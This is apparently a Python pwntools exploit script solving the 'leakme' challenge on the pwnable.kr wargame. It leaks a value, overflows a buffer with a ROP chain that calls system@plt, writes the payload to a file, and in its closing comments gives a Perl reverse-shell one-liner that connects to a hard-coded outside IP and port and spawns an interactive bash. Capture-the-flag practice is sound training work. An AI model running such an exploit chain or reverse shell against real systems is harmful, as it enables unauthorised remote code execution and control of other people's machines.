#!/usr/bin/env python3

from pwn import *
elf = ELF("./leakme_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"

domain= "pwnable.kr"
#domain = "0.0.0.0"
port = 9046

def start():
    if args.REMOTE:
        return remote(domain, port)
    else:
        return process([elf.path],stdin=PTY,stdout=PTY,stderr=PTY)
r = start()

#========= exploit here ===================
def menu1(data):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"bytes",data)

def menu2():
    r.sendlineafter(b">", b"2")
    r.recvuntil(b"read? ")
    line = r.recvline().strip()
    sum_val = int(line.decode(), 16)
    leak = sum_val - 99 * 0x31337
    # Leaks dword [rbp-0x14]
    r.info("Leak raw 4 bytes: " + hex(leak))
    return leak

def menu3(payload):
    r.sendlineafter(b">",b"3")
    r.sendafter(b"now!",payload)

pop_rdi_ret = 0x0000000000400e63 # : pop rdi ; ret

# Useless
libc_base = menu2() << 8*4
r.info(f"Libc (known): {hex(libc_base)}")


payload1 = cyclic(120)
# system("ed bytes?")
payload1 += p64(pop_rdi_ret) + p64(0x00400eb2)
payload1 += p64(0x400886) # system@plt
payload1 += p64(elf.sym.exit)

#menu1(payload)
total = b"1\n" + payload1 + b"\n"

payload3 = b"A"*92 + b"\x77" + b"\x00"*4

#menu3(payload)
total += b"3\n" + payload3 + b"\n"

#r.interactive()

print(total)
open("payload","wb").write(total)

# Local
# (cat payload; echo "\!/bin/sh\nexec 1>/dev/tty && exec 2>/dev/tty"; cat flag*) | ./leakme_patched

# Remote (reverse shell with perl and bore) https://github.com/ekzhang/bore
# (cat /tmp/payload; cat) | nc 0 9046
# !perl -e 'use Socket;$i="159.223.171.199";$p=9137;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};
